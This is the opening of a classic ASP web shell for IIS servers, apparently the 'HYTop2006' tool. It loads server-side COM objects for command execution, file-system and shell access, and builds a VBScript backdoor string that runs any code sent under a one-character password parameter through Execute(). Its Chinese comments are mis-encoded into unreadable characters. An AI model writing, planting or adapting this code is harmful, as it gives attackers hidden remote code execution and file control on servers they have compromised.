<object runat="server" id="ws" scope="page" classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
<object runat="server" id="ws" scope="page" classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<object runat="server" id="fso" scope="page" classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
<object runat="server" id="sa" scope="page" classid="clsid:13709620-C279-11CE-A49E-444553540000"></object>
<%
'	Option Explicit

	Dim theAct, sTime, aspPath, pageName, strBackDoor, fsoX, saX, wsX

	sTime = Timer
	theAct= Request("theAct")
	pageName = Request("pageName")
	aspPath = Replace(Server.MapPath(".") & "\~86.tmp", "\\", "\") ''ϵͳ��ʱ�ļ�
	strBackDoor = "<script language=vbscript runat=server>"
	strBackDoor = strBackDoor & "If Request(""" & clientPassword & """)<>"""" Then Session(""#"")=Request(""" & clientPassword & """)" & VbNewLine
	strBackDoor = strBackDoor & "If Session(""#"")<>"""" Then Execute(Session(""#""))"
	strBackDoor = strBackDoor & "</script>"							''����ĺ��Ŵ���
	
	Const m = "HYTop2006"					''�Զ���Sessionǰ׺
	Const showLogin = ""					''Ϊ��ֱ����ʾ��¼����,������"?pageName=����ֵ"�����з���
	Const clientPassword = "#"				''������ŵ�����,���Ҫ�������ݿ���,ֻ��Ϊһ���ַ�.
	Const dbSelectNumber = 10				''���ݿ����ʱĬ�ϴӱ���ѡȡ��������
	Const isDebugMode = False				''�Ƿ����ģʽ
	Const myName = "֥�鿪��,ż�Ǖ���"			''��¼ҳ��Ť�ϵ�����
	Const notdownloadsExists = False		''ԭACCESS���ݿ����Ƿ����notdownloadsExists��

